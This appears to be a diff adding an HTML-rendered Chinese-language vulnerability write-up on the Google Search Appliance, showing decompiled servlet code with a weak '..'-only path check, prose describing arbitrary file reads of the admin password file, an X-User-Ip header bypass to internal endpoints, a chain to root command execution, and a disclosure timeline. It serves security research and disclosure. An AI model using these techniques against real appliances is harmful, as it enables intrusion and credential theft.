+            &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;403&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Unreadable file:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7fffffff&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;413&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;File too big:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
+            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+            &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;MIME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTypeFromPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;application/octet-stream&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setContentLength&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setContentType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setDateHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Last-Modified&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lastModified&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cacheExpires&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0L&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setDateHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Expires&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;currentTimeMillis&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cacheExpires&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Cache-Control&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;public&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+                &lt;span class=&quot;no&quot;&gt;IO&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;copy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getOutputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
+            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;isValid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Strings&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isEmpty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;..&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;可以發現此處只有檢查字串是否含有 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;..&lt;/code&gt; ，但我們可以直接指定絕對路徑。
+並直接讀取本機任意檔案！&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;舊版GSA 沒有 /font 這個端點，但 /dps/admin 有類似的讀檔問題，可以直接指定 logName 進行檔案讀取，
+可參考下圖直接讀取系統管理介面帳號密碼檔：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;成功破解雜湊後，登入後可以開啟 SNMP 服務配合第一個漏洞並以 root 權限執行任意指令。&lt;/p&gt;
+
+&lt;h3 id=&quot;其他發現跟整理&quot;&gt;其他發現跟整理&lt;/h3&gt;
+
+&lt;h4 id=&quot;服務本身內部網址&quot;&gt;服務本身內部網址&lt;/h4&gt;
+&lt;p&gt;GSA 中有許多的子服務間使用 HTTP 傳輸協定溝通，而在許多服務都有提供 /varz、/helpz、/procz 等網址，
+可以在服務定義的信任網路位置或 127.0.0.1 中存取：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;而在 vGSA 中觀察到服務執行參數有 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;useripheader=X-User-Ip&lt;/code&gt; ，導致對外開放的管理介面可以帶入 X-User-IP 請求頭後直接存取此功能：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;/procz 端點甚至可以抓取執行檔及使用到的共享函示庫：
+&lt;img src=&quot;/assets/img/blog/20230707/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;型號整理&quot;&gt;型號整理&lt;/h4&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;型號&lt;/th&gt;
+      &lt;th&gt;製造商及型號&lt;/th&gt;
+      &lt;th&gt;硬體規格&lt;/th&gt;
+      &lt;th&gt;版號&lt;/th&gt;
+      &lt;th&gt;文件數量&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Google Mini&lt;/td&gt;
+      &lt;td&gt;Gigabyte&lt;/td&gt;
+      &lt;td&gt;&lt;a href=&quot;https://commons.erau.edu/cgi/viewcontent.cgi?article=1153&amp;amp;context=jdfsl&quot;&gt;Pentium III 1G / 2GB memory / 120G&lt;/a&gt;&lt;/td&gt;
+      &lt;td&gt;3.4.14&lt;/td&gt;
+      &lt;td&gt;300,000&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Google Mini-002X&lt;/td&gt;
+      &lt;td&gt;SuperMicro&lt;/td&gt;
+      &lt;td&gt;Pentium 4 3G / 2GB memory / 250G HDD&lt;/td&gt;
+      &lt;td&gt;5.0.0&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Google GB-1001&lt;/td&gt;
+      &lt;td&gt;Dell Poweredge 2950&lt;/td&gt;
+      &lt;td&gt;Xeon / 16GB memory / 1.25TB HDD&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+      &lt;td&gt;3,000,000&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Google GB-1002&lt;/td&gt;
+      &lt;td&gt;Gigabyte&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Google GB-7007&lt;/td&gt;
+      &lt;td&gt;Dell R710&lt;/td&gt;
+      &lt;td&gt;Xeon E5520 / 48GB memory / 3TB HDD&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+      &lt;td&gt;10,000,000&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Google GB-9009&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+      &lt;td&gt;Xeon X5560 / 96GB memory / 3.6TB HDD&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+      &lt;td&gt;30,000,000&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Google G100&lt;/td&gt;
+      &lt;td&gt;Dell R720XD&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Google G500&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h4 id=&quot;核心版本&quot;&gt;核心版本&lt;/h4&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;GSA 版本&lt;/th&gt;
+      &lt;th&gt;核心版本&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;7.6.0&lt;/td&gt;
+      &lt;td&gt;Linux version 3.14.44_gsa-x64_1.5 (mrevutskyi@mrevutskyi.mtv.corp.google.com) (gcc version 4.9.x-google 20150123 (prerelease) (Google_crosstoolv18-gcc-4.9.x-x86_64-grtev4-linux-gnu) ) #1 SMP Mon Nov 23 09:19:11 PST 2015&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;7.4.0&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;7.2.0&lt;/td&gt;
+      &lt;td&gt;Linux version 3.4.3_gsa-x64_1.5 (martincochran@ypc-ubiq202.dls.corp.google.com) (gcc version 4.6.x-google 20120601 (prerelease) (Google_crosstoolv15-gcc-4.6.x-glibc-2.11.1-grte) ) #1 SMP Tue Jul 9 15:36:01 PDT 2013&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;7.0.14&lt;/td&gt;
+      &lt;td&gt;Linux version 3.4.3_gsa-x64_1.3 (stephenamar@neutrino.mtv.corp.google.com) (gcc version 4.6.x-google 20120601 (prerelease) (Google_crosstoolv15-gcc-4.6.x-glibc-2.11.1-grte) ) #1 SMP Thu Jul 19 11:59:57 PDT 2012&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;5.2.0&lt;/td&gt;
+      &lt;td&gt;Linux version 2.6.20_vmw-smp_3.1 (yifeng@yifeng.corp.google.com) (gcc version 4.1.1) #1 SMP Thu Jan 24 22:34:28 PST 2008&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h3 id=&quot;時間軸&quot;&gt;時間軸&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;時間&lt;/th&gt;
+      &lt;th&gt;事件&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2005/06/10&lt;/td&gt;
+      &lt;td&gt;Java Code Injection &lt;a href=&quot;https://seclists.org/fulldisclosure/2005/Nov/652&quot;&gt;CVE-2005-3757&lt;/a&gt; 被 H D Moore 回報&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2008 上半年&lt;/td&gt;
+      &lt;td&gt;釋出 GSA 5.0&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2008/10/28&lt;/td&gt;
+      &lt;td&gt;釋出 vgsa_20081028.7z (5.2.0)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2013/04/20&lt;/td&gt;
+      &lt;td&gt;釋出 GSA 6.14.0.G28&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2014/03/20&lt;/td&gt;
+      &lt;td&gt;XSS 漏洞 &lt;a href=&quot;https://latesthackingnews.com/2014/05/03/xss-vulnerability-found-in-google-search-appliance/&quot;&gt;CVE-2014-0362&lt;/a&gt; 被 Will Dormann 回報&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2014/10/01&lt;/td&gt;
+      &lt;td&gt;釋出 GSA 7.0.14.G238&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2014/10/03&lt;/td&gt;
+      &lt;td&gt;釋出 GSA 7.2.0.G252&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2014/12/12&lt;/td&gt;
+      &lt;td&gt;釋出 GSA 7.2.0.G264&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2015/02/07&lt;/td&gt;
+      &lt;td&gt;釋出 GSA 7.2.0.G270&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2015/04/15&lt;/td&gt;
+      &lt;td&gt;釋出 GSA 7.4.0.G64&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2015/04/22&lt;/td&gt;
+      &lt;td&gt;釋出 GSA 7.4.0.G72&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2015/04/30&lt;/td&gt;
+      &lt;td&gt;釋出 GSA 7.4.0.G74&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2015/06/04&lt;/td&gt;
+      &lt;td&gt;釋出 GSA 7.4.0.G82&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2016 上半年&lt;/td&gt;
+      &lt;td&gt;Google 宣布 GSA 將會逐步退出市場&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2016/01/05&lt;/td&gt;
+      &lt;td&gt;XML 外部實體攻擊 &lt;a href=&quot;https://insinuator.net/2016/03/classical-web-vulns-found-in-google-search-appliance-7-4/&quot;&gt;&lt;/a&gt; 被 Timo 回報&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2016/05/24&lt;/td&gt;
+      &lt;td&gt;釋出 GSA 7.6.0.G36&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2016/07/01&lt;/td&gt;
+      &lt;td&gt;釋出 GSA 7.6.0.G42&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2016/07/31&lt;/td&gt;
+      &lt;td&gt;本文作者取得此設備，版本為 7.0.14&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2016/08/25&lt;/td&gt;
+      &lt;td&gt;釋出 GSA 7.6.0.G46&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2016/10/21&lt;/td&gt;
+      &lt;td&gt;釋出 GSA 7.6.0.G58&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2017/01/19&lt;/td&gt;
+      &lt;td&gt;釋出 GSA 7.6.50.G30&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2017/04/19&lt;/td&gt;
+      &lt;td&gt;釋出 GSA 7.6.50.G36&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2017/07/28&lt;/td&gt;
+      &lt;td&gt;釋出 GSA 7.6.50.G64&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2017/11/09&lt;/td&gt;
+      &lt;td&gt;釋出 GSA 7.6.250.G12&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2017/12/28&lt;/td&gt;
+      &lt;td&gt;最後能訂購 GSA 的日期&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2018/01/17&lt;/td&gt;
+      &lt;td&gt;釋出 GSA 7.6.250.G20&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2018/03/21&lt;/td&gt;
+      &lt;td&gt;釋出 GSA 7.6.250.G26&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2018/06/15&lt;/td&gt;
+      &lt;td&gt;釋出 GSA 7.6.360.G10&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2018/10/08&lt;/td&gt;
+      &lt;td&gt;釋出 GSA 7.6.360.G16&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2019/04/26&lt;/td&gt;
+      &lt;td&gt;釋出 GSA 7.6.512.G18，應該為最後一個版本&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2021/08/16&lt;/td&gt;
+      &lt;td&gt;回報漏洞&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2021/08/16&lt;/td&gt;
+      &lt;td&gt;收到機器人回應確認收到回報信件&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2021/08/16&lt;/td&gt;
+      &lt;td&gt;問題於 issuetracker.google.com 被指派&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2021/08/18&lt;/td&gt;
+      &lt;td&gt;Google 提示漏洞不符合獎金條件，但會於下次會議再次討論&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2021/08/20&lt;/td&gt;
+      &lt;td&gt;確認漏洞不發放獎金&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2021/11/01&lt;/td&gt;
+      &lt;td&gt;詢問漏洞是否會指派 CVE 漏洞編號&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2021/11/02&lt;/td&gt;
+      &lt;td&gt;確認不會有 CVE 漏洞編號&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2023 上半年&lt;/td&gt;
+      &lt;td&gt;開始編寫文章&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2023/06/04&lt;/td&gt;
+      &lt;td&gt;初稿完成&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h3 id=&quot;結論&quot;&gt;結論&lt;/h3&gt;
+
+&lt;p&gt;雖然 GSA/vGSA 已經是結束生命周期的產品，但研究 Google 如何對設備去增加產品的安全性及減少攻擊向量
+可以增加平常較少接觸的知識面。雖然文中沒有詳細說明，包含如使用 Java 的 Security Manager，
+Linux Kernel 的 seccomp 都是 GSA 中有使用的技術，而本次研究中也留下一些可供後續研究的目標：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;feedergate 服務&lt;/li&gt;
+  &lt;li&gt;Oracle 的 Outside-in Technology 轉換文件格式的記憶體漏洞&lt;/li&gt;
+  &lt;li&gt;convert_to_html seccomp sandbox&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;有研究成果時再跟大家分享，下次見。&lt;/p&gt;
+
+&lt;h3 id=&quot;其他參考網址&quot;&gt;其他參考網址&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&quot;&gt;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/&quot;&gt;https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/1333&quot;&gt;https://www.exploit-db.com/exploits/1333&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://commons.erau.edu/cgi/viewcontent.cgi?article=1153&amp;amp;context=jdfsl&quot;&gt;https://commons.erau.edu/cgi/viewcontent.cgi?article=1153&amp;amp;context=jdfsl&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.anandtech.com/show/2407&quot;&gt;https://www.anandtech.com/show/2407&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://groups.google.com/g/google-search-appliance-help/c/Qn5aO5r2Joo/m/PTw8ZDWu6vYJ&quot;&gt;https://groups.google.com/g/google-search-appliance-help/c/Qn5aO5r2Joo/m/PTw8ZDWu6vYJ&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/google/subpar&quot;&gt;https://github.com/google/subpar&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://insinuator.net/2016/03/classical-web-vulns-found-in-google-search-appliance-7-4/&quot;&gt;https://insinuator.net/2016/03/classical-web-vulns-found-in-google-search-appliance-7-4/&lt;/a&gt;&lt;/li&gt;
